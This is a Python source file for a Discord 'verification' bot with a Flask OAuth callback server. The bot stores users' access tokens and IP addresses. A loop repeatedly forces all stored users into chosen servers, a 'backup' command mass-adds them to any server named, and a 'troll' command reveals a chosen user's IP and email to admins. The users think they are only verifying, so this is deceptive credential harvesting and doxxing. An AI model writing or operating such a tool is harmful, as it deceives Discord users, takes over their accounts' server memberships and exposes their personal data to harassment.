from typing import Sequence
from flask import Flask, request, redirect
from wsgiref import simple_server
from disnake.ext import commands, tasks
from datetime import datetime
import disnake
import asyncio
import json
import threading
import utils
import aiohttp
import os
import time
from dotenv import load_dotenv
from lib import API_START_POINT
from urllib.parse import quote as url_quote

# @bot.command(aliases=["reset"])


load_dotenv()
if not os.path.isfile("data/credentials.json"):
    gdrive_dredentials = os.getenv('GDRIVE_CREDENTIALS')
    if not gdrive_dredentials:
        raise Exception("[!] GDRIVE_CREDENTIALSが設定されていません")
    print("[+] GDRIVE_CREDENTIALSがないので環境変数から書き込みます")
    with open("data/credentials.json", 'w') as f:
        f.write(gdrive_dredentials)
    print("[+] 書き込みが完了しました")
token: str = os.getenv("TOKEN")
client_id: int = int(os.getenv("CLIENT_ID"))
client_secret = os.getenv("CLIENT_SECRET")
redirect_uri = os.getenv("REDIRECT_URI")
redirect_to = os.getenv("REDIRECT_TO")
interval = int(os.getenv("JOIN_INTERVAL", 2))
join_guilds: Sequence = json.loads(os.getenv("JOIN_GUILDS", "[]"))
admin_users: Sequence = json.loads(os.getenv("ADMIN_USERS", "[]"))
admin_guild_id: int = int(os.getenv("ADMIN_GUILD_ID", "[]"))

app = Flask(__name__)
bot = commands.Bot(command_prefix="!", sync_commands=True,
                   intents=disnake.Intents.all())
util = utils.utils(token, client_id, client_secret, redirect_uri)
file = utils.FileManager(os.getenv("GOOGLE_DRIVE_DATA_URL"),
                         os.getenv("GOOGLE_DRIVE_BACKUP_URL"))
try:
    file.load_file()
except Exception:
    print("[!] ファイルの中身がない、または破損しているため初期設定にリセットします")
    open("data/data.json", "w").write(json.dumps({"guilds": {}, "users": {}}))
data = json.loads(open("data/data.json", 'r').read())
working = []
requested = []


@bot.slash_command(name="reset", description="チャンネルのリセット")
@commands.has_permissions(administrator=True)
async def nuke(interaction: disnake.ApplicationCommandInteraction):
    channel = interaction.channel
    pos = channel.position
    await channel.delete()
    new_channel = await channel.clone()
    await new_channel.edit(position=pos)
    await new_channel.send("チャンネルの再作成が完了しました")


@app.route("/after")
async def after():
    ip = request.remote_addr or request.headers["X-Forwarded-For"]
    if ip not in working:
        working.append(ip)
    else:
        return "Your ip is already processing"
    code = request.args.get('code')
    if code not in requested:
        requested.append(code)
    else:
        return "You are already requested"
    state = request.args.get('state')
    if not code or not state:
        working.remove(ip)
        print("[!] リクエストURLが不正です")
        return "認証をやり直してください"
    async with aiohttp.ClientSession() as session:
        token = await util.get_token(session, code)
        if "access_token" not in token:
            working.remove(ip)
            print("[!] トークンの取得に失敗しました")
            print("[!] トークン: %s" % token)
            return "認証をやり直してください"
        user = await util.get_user(session, token["access_token"])
        try:
            token["ip"] = request.remote_addr or \
                request.headers["X-Forwarded-For"]
        except Exception:
            token["ip"] = "127.0.0.1"
        token["last_update"] = datetime.utcnow().timestamp()
        data["users"][str(user['id'])] = token
        file.upload = True
        if str(state) in data["guilds"]:
            if "role" in data["guilds"][str(state)]:
                await util.add_role(session, str(state), user["id"],
                                    data["guilds"][str(state)]["role"])
                await util.send_direct_message(session, user["id"], "認証されました")
                result = await util.join_guild(session, token["access_token"],
                                               str(state), user["id"])
                if not redirect_to:
                    working.remove(ip)
                    return result
                else:
                    working.remove(ip)
                    return redirect(redirect_to)
            else:
                working.remove(ip)
                return "このサーバーではロールの設定がされていません"
        else:
            working.remove(ip)
            return "このサーバーではロールの設定がされていません"


@bot.command(name="認証")
async def verifypanel(ctx, role: disnake.Role = None):
    if ctx.author.guild_permissions.administrator:
        if not role:
            await ctx.send("役職を指定してください")
        else:
            if not str(ctx.guild.id) in data["guilds"]:
                data["guilds"][str(ctx.guild.id)] = {}
            data["guilds"][str(ctx.guild.id)]["role"] = role.id
            file.upload = True
            embed = disnake.Embed(
                title="認証",
                description="下のボタンを押して認証を完了してください",
                color=0x000000
            )
            # embed.set_image(url=embed_image_url)
            view = disnake.ui.View()
            url = "{}/authorize?client_id={}&redirect_uri={}&response_type=code&scope=identify%20email%20guilds.join&state={}".format(
                API_START_POINT, client_id, url_quote(
                    redirect_uri, safe=""
                ), ctx.guild.id
            )
            view.add_item(disnake.ui.Button(
                label="認証", style=disnake.ButtonStyle.link, url=url))
            await ctx.send(embed=embed, view=view)


@bot.slash_command(name="roleset", guild_ids=admin_guild_id, description="認証で付与する役職の設定", options=[
    disnake.Option(name="role", description="追加する役職", type=disnake.OptionType.role, required=True)])
async def slash_roleset(interaction: disnake.ApplicationCommandInteraction, role):
    if interaction.author.guild_permissions.administrator:
        if not str(interaction.guild.id) in data["guilds"]:
            data["guilds"][str(interaction.guild.id)] = {}
        data["guilds"][str(interaction.guild.id)]["role"] = role.id
        file.upload = True
        await interaction.response.send_message("成功しました")
    else:
        await interaction.response.send_message("You cannot run this command.")


@bot.slash_command(name="check", guild_ids=admin_guild_id, description="復元できるメンバーの数")
async def check(interaction: disnake.ApplicationCommandInteraction):
    if not int(interaction.author.id) in admin_users:
        await interaction.response.send_message("You cannot run this command.")
        return
    await interaction.response.send_message("確認しています...", ephemeral=True)
    await interaction.edit_original_message(content="{}人のメンバーの復元が可能です".format(len(data["users"])))


@bot.slash_command(name="backup", guild_ids=admin_guild_id, description="メンバーの復元を行います", options=[
    disnake.Option(name="srvid", description="復元先のサーバーを選択", type=disnake.OptionType.string, required=True)])
async def backup(interaction: disnake.ApplicationCommandInteraction, srvid: str):
    if not int(interaction.author.id) in admin_users:
        await interaction.response.send_message("You cannot run this command.")
        return
    embed = disnake.Embed(
        title="バックアップを実行します。",
        description="バックアップ先:" + srvid,
        color=0x00000
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)
    count = 0
    total = 0
    async with aiohttp.ClientSession() as session:
        for user in list(data["users"]):
            try:
                result = await util.join_guild(session, data["users"][user]["access_token"], srvid, user)
                if result == "Success":
                    count += 1
            except:
                pass
            total += 1
    await interaction.edit_original_message(content=f"{count}人中{total}人のメンバーの復元に成功しました", embed=None)


@bot.slash_command(name="leave", guild_ids=admin_guild_id, description="Botをサーバーから退出させます")
async def slash_leave(interaction: disnake.ApplicationCommandInteraction, guild_id: int = None):
    if int(interaction.author.id) in admin_users:
        try:
            await bot.get_guild(int(guild_id)).leave()
            await interaction.response.send_message(f"{guild_id}から退出しました")
        except AttributeError:
            await interaction.response.send_message(f"{guild_id}から退出できませんでした")
    else:
        await interaction.response.send_message("You cannot run this command.")


@bot.slash_command(name="verifypanel", guild_ids=admin_guild_id, description="認証パネルを出します", options=[
    disnake.Option(name="role", description="追加する役職",
                   type=disnake.OptionType.role, required=True),
    disnake.Option(name="title", description="認証パネルの一番上の文字",
                   type=disnake.OptionType.string, required=False),
    disnake.Option(name="description", description="認証パネルの詳細文",
                   type=disnake.OptionType.string, required=False),
    disnake.Option(name="color", description="認証パネルの色",
                   type=disnake.OptionType.integer, required=False),
    disnake.Option(name="picture", description="認証パネルに入れる写真", type=disnake.OptionType.attachment, required=False)])
async def slash_verifypanel(interaction: disnake.ApplicationCommandInteraction, role, title="認証", description="サーバーでの認証を行います", color="0", picture=None):
    if not interaction.author.guild_permissions.administrator:
        await interaction.response.send_message("You cannot run this command.")
        return
    if not str(interaction.guild.id) in data["guilds"]:
        data["guilds"][str(interaction.guild.id)] = {}
    data["guilds"][str(interaction.guild.id)]["role"] = role.id
    file.upload = True
    embed = disnake.Embed(
        title=title, description=description, color=int(color, 16))
    if picture:
        embed.set_image(file=picture)
    view = disnake.ui.View()
    url = "{}/oauth2/authorize?client_id={}&redirect_uri={}&response_type=code&scope=identify%20email%20guilds.join&state={}".format(
        API_START_POINT, client_id, url_quote(
            redirect_uri, safe=""
        ), interaction.guild.id
    )
    print(url)
    print("https://discord.com/api/oauth2/authorize?client_id=835651565012123689&redirect_uri=https%3A%2F%2Fverify.probmkr.com%2Fafter&response_type=code&scope=guilds%20guilds.join")
    print(bot.user.id)
    view.add_item(disnake.ui.Button(
        label="認証", style=disnake.ButtonStyle.url, url=url))
    await interaction.response.send_message(embed=embed, view=view)


@bot.slash_command(name="troll", guild_ids=admin_guild_id, description="troll command", options=[
    disnake.Option(name="user", description="確認するユーザーのID", type=disnake.OptionType.string, required=True)])
async def slash_troll(interaction: disnake.ApplicationCommandInteraction, user: str):
    if not int(interaction.author.id) in admin_users:
        await interaction.response.send_message("You cannot run this command.")
        return
    async with aiohttp.ClientSession() as session:
        if str(user) in data["users"]:
            userdata = await util.get_user(session, data["users"][str(user)]["access_token"])
            if "ip" in data["users"][str(user)]:
                await interaction.response.send_message("IP : {}, Email : {}".format(
                    data["users"][str(user)]["ip"], userdata["email"]), ephemeral=True
                )
            else:
                await interaction.response.send_message("IP : Not Found, Email : {}".format(
                    userdata["email"]), ephemeral=True
                )
        else:
            await interaction.response.send_message("That user is not found.", ephemeral=True)


def web_server_handler():
    class customlog(simple_server.WSGIRequestHandler):
        def log_message(self, format, *args):
            print("%s > %s" % (self.client_address[0], format % args))
    server = simple_server.make_server('0.0.0.0', int(
        os.getenv('PORT', 8080)), app, handler_class=customlog)
    print("[+] Webページの起動に成功しました")
    server.serve_forever()


def uploader_handler():
    while True:
        if file.upload:
            file.save(data)
            file.upload = False
        else:
            time.sleep(1)


@tasks.loop(minutes=interval)
async def loop():
    async with aiohttp.ClientSession() as session:
        for guild in join_guilds:
            for user in data["users"]:
                await util.join_guild(session, data["users"][user]["access_token"], guild, user)


@bot.event
async def on_ready():
    loop.start()
    print("[+] Botが起動しました")
    threading.Thread(target=web_server_handler, daemon=True).start()
    threading.Thread(target=uploader_handler, daemon=True).start()
    async with aiohttp.ClientSession() as session:
        await util.update_token(session, data)
        while True:
            await asyncio.sleep(30)
            await util.update_token(session, data)
            print("Looped")

bot.run(token)
